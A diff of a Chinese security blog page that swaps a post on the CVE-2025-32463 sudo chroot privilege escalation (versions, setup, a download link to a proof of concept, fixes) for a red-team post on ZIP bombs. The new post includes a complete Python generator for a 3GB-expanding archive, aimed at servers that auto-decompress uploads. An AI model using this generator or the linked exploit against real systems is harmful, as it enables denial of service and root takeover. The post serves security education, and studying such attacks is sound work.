@@ -1,19 +1,19 @@
 <!DOCTYPE html>
 <html lang="zh-cn" dir="ltr">
     <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="0x01 简介 sudo chroot是 Linux 系统中一个强大的命令组合，用于以超级用户权限切换到一个指定的目录，并将其作为新的根目录运行命令或启动会话。sudo用于获取管理员权限，而\u00a0chroot（change root）则会将指定目录设置为新的根目录，从而创建一个隔离的环境。这种组合常用于系统维护、软件测试和安全隔离等场景。例如，在修复系统问题时，可以通过\u00a0sudo chroot进入一个隔离的环境，避免对主系统造成进一步影响；在软件测试中，可以限制测试环境的范围，防止潜在的系统级问题。通过这种方式，sudo chroot提供了一种灵活且安全的方式来管理和操作 Linux 系统。\n">
-<title>【CVE-2025-32463】Linux sudo chroot 本地提权</title>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="前言 压缩包炸弹（又称解压炸弹）是利用压缩算法的重复数据高效压缩特性，以极小体积在解压时产生海量数据，从而耗尽系统 CPU、内存、磁盘等资源，达成拒绝服务（DoS）或绕过安全扫描的恶意文件。以下从原理与业务场景两方面展开说明。\n">
+<title>【红队】ZIP炸弹漏洞</title>
 
-<link rel='canonical' href='http://localhost:1313/p/cve-2025-32463linux-sudo-chroot-%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/'>
+<link rel='canonical' href='http://localhost:1313/p/%E7%BA%A2%E9%98%9Fzip%E7%82%B8%E5%BC%B9%E6%BC%8F%E6%B4%9E/'>
 
-<link rel="stylesheet" href="/scss/style.min.ded09199e10d7e343e92a3d06815e1792f7733e4086835e30d0740e630f272ae.css"><meta property='og:title' content="【CVE-2025-32463】Linux sudo chroot 本地提权">
-<meta property='og:description' content="0x01 简介 sudo chroot是 Linux 系统中一个强大的命令组合，用于以超级用户权限切换到一个指定的目录，并将其作为新的根目录运行命令或启动会话。sudo用于获取管理员权限，而\u00a0chroot（change root）则会将指定目录设置为新的根目录，从而创建一个隔离的环境。这种组合常用于系统维护、软件测试和安全隔离等场景。例如，在修复系统问题时，可以通过\u00a0sudo chroot进入一个隔离的环境，避免对主系统造成进一步影响；在软件测试中，可以限制测试环境的范围，防止潜在的系统级问题。通过这种方式，sudo chroot提供了一种灵活且安全的方式来管理和操作 Linux 系统。\n">
-<meta property='og:url' content='http://localhost:1313/p/cve-2025-32463linux-sudo-chroot-%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/'>
+<link rel="stylesheet" href="/scss/style.min.ded09199e10d7e343e92a3d06815e1792f7733e4086835e30d0740e630f272ae.css"><meta property='og:title' content="【红队】ZIP炸弹漏洞">
+<meta property='og:description' content="前言 压缩包炸弹（又称解压炸弹）是利用压缩算法的重复数据高效压缩特性，以极小体积在解压时产生海量数据，从而耗尽系统 CPU、内存、磁盘等资源，达成拒绝服务（DoS）或绕过安全扫描的恶意文件。以下从原理与业务场景两方面展开说明。\n">
+<meta property='og:url' content='http://localhost:1313/p/%E7%BA%A2%E9%98%9Fzip%E7%82%B8%E5%BC%B9%E6%BC%8F%E6%B4%9E/'>
 <meta property='og:site_name' content='SlimerのBlog'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-10-10T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-10-10T00:00:00&#43;00:00'/><meta property='og:image' content='http://localhost:1313/images/91.webp' />
-<meta name="twitter:title" content="【CVE-2025-32463】Linux sudo chroot 本地提权">
-<meta name="twitter:description" content="0x01 简介 sudo chroot是 Linux 系统中一个强大的命令组合，用于以超级用户权限切换到一个指定的目录，并将其作为新的根目录运行命令或启动会话。sudo用于获取管理员权限，而\u00a0chroot（change root）则会将指定目录设置为新的根目录，从而创建一个隔离的环境。这种组合常用于系统维护、软件测试和安全隔离等场景。例如，在修复系统问题时，可以通过\u00a0sudo chroot进入一个隔离的环境，避免对主系统造成进一步影响；在软件测试中，可以限制测试环境的范围，防止潜在的系统级问题。通过这种方式，sudo chroot提供了一种灵活且安全的方式来管理和操作 Linux 系统。\n"><meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:image" content='http://localhost:1313/images/91.webp' />
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2026-03-26T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2026-03-26T00:00:00&#43;00:00'/><meta property='og:image' content='http://localhost:1313/images/127.webp' />
+<meta name="twitter:title" content="【红队】ZIP炸弹漏洞">
+<meta name="twitter:description" content="前言 压缩包炸弹（又称解压炸弹）是利用压缩算法的重复数据高效压缩特性，以极小体积在解压时产生海量数据，从而耗尽系统 CPU、内存、磁盘等资源，达成拒绝服务（DoS）或绕过安全扫描的恶意文件。以下从原理与业务场景两方面展开说明。\n"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='http://localhost:1313/images/127.webp' />
     <link rel="shortcut icon" href="/favicon.ico" />
 
     </head>
@@ -232,13 +232,11 @@
         <div class="widget--toc">
             <nav id="TableOfContents">
   <ul>
-    <li><a href="#0x01-简介">0x01 简介</a></li>
-    <li><a href="#0x02-漏洞描述">0x02 漏洞描述</a></li>
-    <li><a href="#0x03-利用条件">0x03 利用条件</a></li>
-    <li><a href="#0x04-环境搭建">0x04 环境搭建</a></li>
-    <li><a href="#0x05-漏洞复现">0x05 漏洞复现</a></li>
-    <li><a href="#0x06-修复建议">0x06 修复建议</a></li>
-    <li><a href="#参考链接">参考链接</a></li>
+    <li><a href="#前言">前言</a></li>
+    <li><a href="#核心原理">核心原理</a></li>
+    <li><a href="#业务场景">业务场景</a></li>
+    <li><a href="#利用方法">利用方法</a></li>
+    <li><a href="#影响">影响</a></li>
   </ul>
 </nav>
         </div>
@@ -253,9 +251,9 @@
     <article class="has-image main-article">
     <header class="article-header">
         <div class="article-image">
-            <a href="/p/cve-2025-32463linux-sudo-chroot-%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/">
+            <a href="/p/%E7%BA%A2%E9%98%9Fzip%E7%82%B8%E5%BC%B9%E6%BC%8F%E6%B4%9E/">
                 
-                    <img src="/images/91.webp" loading="lazy" alt="Featured image of post 【CVE-2025-32463】Linux sudo chroot 本地提权" />
+                    <img src="/images/127.webp" loading="lazy" alt="Featured image of post 【红队】ZIP炸弹漏洞" />
                 
             </a>
         </div>
@@ -264,14 +262,6 @@
     <div class="article-details">
     
     <header class="article-category">
-        
-            <a href="/categories/%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2/" style="background-color: #2b2d42; color: #edf2f4;">
-                内网攻防
-            </a>
-        
-            <a href="/categories/%E5%B7%A5%E5%85%B7/" style="background-color: #c8102e; color: #fffbf0;">
-                工具
-            </a>
         
             <a href="/categories/%E7%BA%A2%E9%98%9F/" style="background-color: #ff6b6b; color: #ffffff;">
                 红队
@@ -283,7 +273,7 @@
 
     <div class="article-title-wrapper">
         <h2 class="article-title">
-            <a href="/p/cve-2025-32463linux-sudo-chroot-%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/">【CVE-2025-32463】Linux sudo chroot 本地提权</a>
+            <a href="/p/%E7%BA%A2%E9%98%9Fzip%E7%82%B8%E5%BC%B9%E6%BC%8F%E6%B4%9E/">【红队】ZIP炸弹漏洞</a>
         </h2>
     
         
@@ -307,10 +297,10 @@
   <path d="M7 3v4" />
   <path d="M3 11h16" />
   <path d="M18 16.496v1.504l1 1" />
-</svg>2025年10月10日</time>
+</svg>2026年03月26日</time>
                 <span class="article-word-count">
                     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M14 2H6a2 2 0 0 0 -2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2 -2V8z" /><polyline points="14 2 14 8 20 8" /><line x1="16" y1="13" x2="8" y2="13" /><line x1="16" y1="17" x2="8" y2="17" /><polyline points="10 9 9 9 8 9" /></svg>
-                    文章共962字
+                    文章共1101字
                 </span>
             </div>
 			
@@ -329,83 +319,133 @@
     <section class="article-content">
     
     
-    <h1 id="0x01-简介">0x01 简介</h1>
-<p><code>sudo chroot</code>是 Linux 系统中一个强大的命令组合，用于以超级用户权限切换到一个指定的目录，并将其作为新的根目录运行命令或启动会话。<code>sudo</code>用于获取管理员权限，而 <code>chroot</code>（change root）则会将指定目录设置为新的根目录，从而创建一个隔离的环境。这种组合常用于系统维护、软件测试和安全隔离等场景。例如，在修复系统问题时，可以通过 <code>sudo chroot</code>进入一个隔离的环境，避免对主系统造成进一步影响；在软件测试中，可以限制测试环境的范围，防止潜在的系统级问题。通过这种方式，<code>sudo chroot</code>提供了一种灵活且安全的方式来管理和操作 Linux 系统。</p>
-<h1 id="0x02-漏洞描述">0x02 漏洞描述</h1>
-<p><strong>漏洞编号：CVE-2025-32463</strong><br>
-这是一个严重的本地提权漏洞，该漏洞 CVSS 评分为 7.8，属于高危漏洞。该漏洞允许本地低权限用户通过特制的恶意 <code>chroot</code>环境触发动态库加载，从而以 root 权限执行任意代码。攻击者可以利用 <code>sudo</code>的 <code>-R</code>（即 <code>--chroot</code>）选项，诱骗 <code>sudo</code>使用用户指定的根目录加载恶意共享库。问题根源在于 <code>sudo</code>在读取 <code>sudoers</code>配置文件之前，就开始在用户控制的 <code>chroot</code>环境中解析路径。</p>
-<h1 id="0x03-利用条件">0x03 利用条件</h1>
-<h2 id="1-影响版本">1) 影响版本</h2>
-<p><code>sudo --version</code>若输出的版本信息在 1.9.14 至 1.9.17 之间<br>
-1.9.14 &lt;= sudo &lt;= 1.9.17<br>
-1.8 系列及更早版本不受影响，因为它们不包含 chroot 功能。 在特定配置或发行版中，即使该版本早于官方公告，潜在的不安全行为仍可能被利用。</p>
-<h2 id="2-权限要求">2) 权限要求</h2>
-<p>普通用户</p>
-<h2 id="3-其他条件">3) 其他条件</h2>
-<p><code>sudo</code>版本要能使用 <code>--chroot</code>功能</p>
-<h1 id="0x04-环境搭建">0x04 环境搭建</h1>
-<p>作者已尝试在 ubuntu-22.04.5-desktop-amd64 以及 ubuntu-18.04.6-desktop-amd64 复现过，均以失败告终，最后在 kali-linux-2024.1-amd64 上复现成功，后面又测试了几个系统，确认 <strong>Fedora 41 Server</strong> 以及 <strong>Ubuntu 24.04-1</strong> 也可被攻击。</p>
+    <h1 id="前言">前言</h1>
+<p>压缩包炸弹（又称解压炸弹）是利用压缩算法的重复数据高效压缩特性，以极小体积在解压时产生海量数据，从而耗尽系统 CPU、内存、磁盘等资源，达成拒绝服务（DoS）或绕过安全扫描的恶意文件。以下从原理与业务场景两方面展开说明。</p>
+<h1 id="核心原理">核心原理</h1>
 <ul>
-<li>去官网下载 sudo 是漏洞版本内的 Linux ISO，这里以 2024 年第一版的 Kali 为例子。</li>
+<li>超高压缩比构造：利用 DEFLATE、BZIP2 等算法对高度重复数据（如全零、相同字符）的极致压缩能力，生成 “扁平型” 炸弹。例如 1GB 全零文件可压缩至数 KB，解压时瞬间膨胀，直接填满磁盘。典型案例如 42.zip，42KB 压缩包解压后达 4.5PB，依赖多层嵌套与高压缩比结合实现。</li>
+<li>递归嵌套结构：采用 “压缩包套压缩包” 的多层嵌套设计，每层包含多个同级压缩包副本，解压时触发递归膨胀。如 42.zip 为 5 层嵌套，每层 16 个副本，最终生成超百万个**</li>
+<li>大文件，总容量指数级增长。</li>
+<li>资源耗尽机制：解压过程中，CPU 需处理海量数据解码，内存暂存解压流，磁盘写入膨胀数据，任一环节超限即导致系统卡顿、崩溃或服务不可用。同时可瘫痪依赖解压扫描的杀毒软件，为后续恶意代码入侵创造条件。</li>
 </ul>
+<h1 id="业务场景">业务场景</h1>
+<p>业务<strong>自动解压</strong>：上传后系统自动解压压缩包（如云存储的解压预览、OA 的附件解压分发、电商的商品素材解压存储）</p>
+<h1 id="利用方法">利用方法</h1>
+<p>压缩包炸弹生成脚本</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">https://old.kali.org/kali-images/kali-2024.1/
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">zipfile</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">create_zip_bomb</span><span class="p">(</span><span class="n">zip_filename</span><span class="p">,</span> <span class="n">target_uncompressed_size_gb</span><span class="p">,</span> <span class="n">chunk_size_mb</span><span class="o">=</span><span class="mi">10</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">    创建压缩包炸弹（修复ZIP64支持，适配大文件写入）
+</span></span></span><span class="line"><span class="cl"><span class="s2">    :param zip_filename: 输出的压缩包文件名
+</span></span></span><span class="line"><span class="cl"><span class="s2">    :param target_uncompressed_size_gb: 解压后的目标大小（GB）
+</span></span></span><span class="line"><span class="cl"><span class="s2">    :param chunk_size_mb: 每次写入的块大小（MB），避免内存溢出
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 单位转换：GB -&gt; MB -&gt; Bytes</span>
+</span></span><span class="line"><span class="cl">    <span class="n">target_size_bytes</span> <span class="o">=</span> <span class="n">target_uncompressed_size_gb</span> <span class="o">*</span> <span class="mi">1024</span> <span class="o">*</span> <span class="mi">1024</span> <span class="o">*</span> <span class="mi">1024</span>
+</span></span><span class="line"><span class="cl">    <span class="n">chunk_size_bytes</span> <span class="o">=</span> <span class="n">chunk_size_mb</span> <span class="o">*</span> <span class="mi">1024</span> <span class="o">*</span> <span class="mi">1024</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># 生成全零数据块（压缩算法对重复数据压缩比极高）</span>
+</span></span><span class="line"><span class="cl">    <span class="n">zero_chunk</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span> <span class="o">*</span> <span class="n">chunk_size_bytes</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># 关键修复：启用ZIP64扩展，支持大文件写入</span>
+</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="n">zipfile</span><span class="o">.</span><span class="n">ZipFile</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="n">zip_filename</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;w&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">compression</span><span class="o">=</span><span class="n">zipfile</span><span class="o">.</span><span class="n">ZIP_DEFLATED</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">compresslevel</span><span class="o">=</span><span class="mi">9</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">allowZip64</span><span class="o">=</span><span class="kc">True</span>  <span class="c1"># 启用ZIP64，支持大于4GB的文件（3GB也需要这个参数）</span>
+</span></span><span class="line"><span class="cl">    <span class="p">)</span> <span class="k">as</span> <span class="n">zf</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># 向压缩包中写入一个名为large_file.bin的文件</span>
+</span></span><span class="line"><span class="cl">        <span class="k">with</span> <span class="n">zf</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s1">&#39;large_file.bin&#39;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">,</span> <span class="n">force_zip64</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>  <span class="c1"># 强制使用ZIP64</span>
+</span></span><span class="line"><span class="cl">            <span class="n">written_bytes</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">            <span class="c1"># 分块写入，直到达到目标大小</span>
+</span></span><span class="line"><span class="cl">            <span class="k">while</span> <span class="n">written_bytes</span> <span class="o">&lt;</span> <span class="n">target_size_bytes</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="c1"># 最后一块可能不足chunk_size，避免超出目标大小</span>
+</span></span><span class="line"><span class="cl">                <span class="n">remaining</span> <span class="o">=</span> <span class="n">target_size_bytes</span> <span class="o">-</span> <span class="n">written_bytes</span>
+</span></span><span class="line"><span class="cl">                <span class="n">write_chunk</span> <span class="o">=</span> <span class="n">zero_chunk</span> <span class="k">if</span> <span class="n">remaining</span> <span class="o">&gt;=</span> <span class="n">chunk_size_bytes</span> <span class="k">else</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span> <span class="o">*</span> <span class="n">remaining</span>
+</span></span><span class="line"><span class="cl">                <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">write_chunk</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="n">written_bytes</span> <span class="o">+=</span> <span class="nb">len</span><span class="p">(</span><span class="n">write_chunk</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="c1"># 打印进度（可选）</span>
+</span></span><span class="line"><span class="cl">                <span class="n">progress</span> <span class="o">=</span> <span class="p">(</span><span class="n">written_bytes</span> <span class="o">/</span> <span class="n">target_size_bytes</span><span class="p">)</span> <span class="o">*</span> <span class="mi">100</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;写入进度: </span><span class="si">{</span><span class="n">progress</span><span class="si">:</span><span class="s2">.2f</span><span class="si">}</span><span class="s2">%&#34;</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s1">&#39;</span><span class="se">\r</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># 输出结果信息</span>
+</span></span><span class="line"><span class="cl">    <span class="n">zip_size_mb</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">getsize</span><span class="p">(</span><span class="n">zip_filename</span><span class="p">)</span> <span class="o">/</span> <span class="p">(</span><span class="mi">1024</span> <span class="o">*</span> <span class="mi">1024</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">压缩包生成完成！&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;压缩包文件名: </span><span class="si">{</span><span class="n">zip_filename</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;压缩包大小: </span><span class="si">{</span><span class="n">zip_size_mb</span><span class="si">:</span><span class="s2">.2f</span><span class="si">}</span><span class="s2"> MB&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;解压后大小: </span><span class="si">{</span><span class="n">target_uncompressed_size_gb</span><span class="si">}</span><span class="s2"> GB&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 生成解压后3GB、压缩包小于3MB的炸弹</span>
+</span></span><span class="line"><span class="cl">    <span class="n">create_zip_bomb</span><span class="p">(</span><span class="s2">&#34;zip_bomb_3gb.zip&#34;</span><span class="p">,</span> <span class="n">target_uncompressed_size_gb</span><span class="o">=</span><span class="mi">3</span><span class="p">)</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><ul>
-<li>然后就是在 VMware 上配置 Kali 虚拟机了，这一系列过程就不赘述了。</li>
-</ul>
-<h1 id="0x05-漏洞复现">0x05 漏洞复现</h1>
-<p>POC：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">通过网盘分享的文件：CVE-2025-32463_chwoot-main.zip
-</span></span><span class="line"><span class="cl">链接: https://pan.baidu.com/s/1Qkb8ohhQPdwNope5RxZ11w 提取码: ynwk 
-</span></span><span class="line"><span class="cl">--来自百度网盘超级会员v4的分享
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p><img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251010154955.png" alt="image.png"></p>
-<h1 id="0x06-修复建议">0x06 修复建议</h1>
-<ul>
-<li>安全更新</li>
-<li>目前官方已发布安全更新，建议用户尽快升级至最新版本：sudo &gt;= 1.9.17p1</li>
-<li>官方补丁</li>
-</ul>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">- https://www.sudo.ws/security/advisories/host_any/
-</span></span><span class="line"><span class="cl">- https://www.sudo.ws/security/advisories/chroot_bug
-</span></span></code></pre></td></tr></table>
-</div>
-</div><ul>
-<li>临时处置</li>
-<li>在环境中搜索任何使用了 Host 或 Host_Alias 选项的内容。检查 <code>/etc/sudoers</code>中定义的所有 Sudo 规则以及 <code>/etc/sudoers.d</code>下的文件。如果 Sudo 规则存储在 LDAP 中，请使用 ldapsearch 等工具转储这些规则。</li>
-</ul>
-<h1 id="参考链接">参考链接</h1>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">https://ubuntu.com/security/CVE-2025-32463
-</span></span><span class="line"><span class="cl">https://nvd.nist.gov/vuln/detail/CVE-2025-32463
-</span></span></code></pre></td></tr></table>
-</div>
-</div>
+</div><p><img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260326101215.png" alt="image.png"><br>
+可以发现压缩包大小不超过4m,而解压后却能达到3g<br>
+<img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260326101229.png" alt="image.png"></p>
+<h1 id="影响">影响</h1>
+<p>若在上传文件时，系统后端设置了自动解压，则可耗尽服务器存储资源造成服务宕机</p>
+
 </section>
 
 
@@ -429,82 +469,6 @@
             
                 
 <article class="has-image">
-    <a href="/p/poccve-2026-24061-telnet%E8%BF%9C%E7%A8%8B%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E6%89%B9%E9%87%8F%E6%A3%80%E6%B5%8B%E5%B7%A5%E5%85%B7/">
-        
-        
-            <div class="article-image">
-                
-                    <img src="/images/116.webp" loading="lazy" data-key="" data-hash="/images/116.webp"/>
-                
-            </div>
-        
-
-        <div class="article-details">
-            <h2 class="article-title">【POC】CVE-2026-24061 telnet远程认证绕过漏洞批量检测工具</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="has-image">
-    <a href="/p/%E8%B5%84%E4%BA%A7%E6%94%B6%E9%9B%86enscan_go-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7/">
-        
-        
-            <div class="article-image">
-                
-                    <img src="/images/82.webp" loading="lazy" data-key="" data-hash="/images/82.webp"/>
-                
-            </div>
-        
-
-        <div class="article-details">
-            <h2 class="article-title">【资产收集】ENScan_Go-信息收集工具</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="has-image">
-    <a href="/p/%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2windows%E5%B7%A5%E4%BD%9C%E7%BB%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">
-        
-        
-            <div class="article-image">
-                
-                    <img src="/images/13.webp" loading="lazy" data-key="" data-hash="/images/13.webp"/>
-                
-            </div>
-        
-
-        <div class="article-details">
-            <h2 class="article-title">【内网攻防】Windows工作组信息收集</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="has-image">
-    <a href="/p/%E7%BA%A2%E9%98%9Fzip%E7%82%B8%E5%BC%B9%E6%BC%8F%E6%B4%9E/">
-        
-        
-            <div class="article-image">
-                
-                    <img src="/images/127.webp" loading="lazy" data-key="" data-hash="/images/127.webp"/>
-                
-            </div>
-        
-
-        <div class="article-details">
-            <h2 class="article-title">【红队】ZIP炸弹漏洞</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="has-image">
     <a href="/p/%E6%90%AC%E8%BF%90405-%E7%BB%95%E8%BF%87%E4%B8%8E%E6%9C%AA%E6%8E%88%E6%9D%83%E6%B7%B1%E5%BA%A6%E5%88%A9%E7%94%A8%E5%90%88%E9%9B%86/">
         
         
@@ -517,6 +481,82 @@
 
         <div class="article-details">
             <h2 class="article-title">【搬运】405 绕过与未授权深度利用合集</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/%E6%B0%B4%E5%B9%B3%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/images/124.webp" loading="lazy" data-key="" data-hash="/images/124.webp"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">水平越权漏洞详解</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/%E6%90%AC%E8%BF%90%E6%9F%90%E5%85%AC%E5%8F%B8%E7%9A%84%E6%B8%97%E9%80%8F%E6%8A%80%E8%83%BD%E8%80%83%E6%A0%B8%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/images/122.webp" loading="lazy" data-key="" data-hash="/images/122.webp"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">【搬运】某公司的渗透技能考核靶场通关记录</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/%E7%BA%A2%E9%98%9F%E9%9D%92%E9%BE%99%E9%9D%A2%E6%9D%BF%E8%BF%9C%E7%A8%8Brce%E6%BC%8F%E6%B4%9E/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/images/120.webp" loading="lazy" data-key="" data-hash="/images/120.webp"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">【红队】青龙面板远程RCE漏洞</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/poccve-2026-24061-telnet%E8%BF%9C%E7%A8%8B%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E6%89%B9%E9%87%8F%E6%A3%80%E6%B5%8B%E5%B7%A5%E5%85%B7/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/images/116.webp" loading="lazy" data-key="" data-hash="/images/116.webp"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">【POC】CVE-2026-24061 telnet远程认证绕过漏洞批量检测工具</h2>
         </div>
     </a>
 </article>
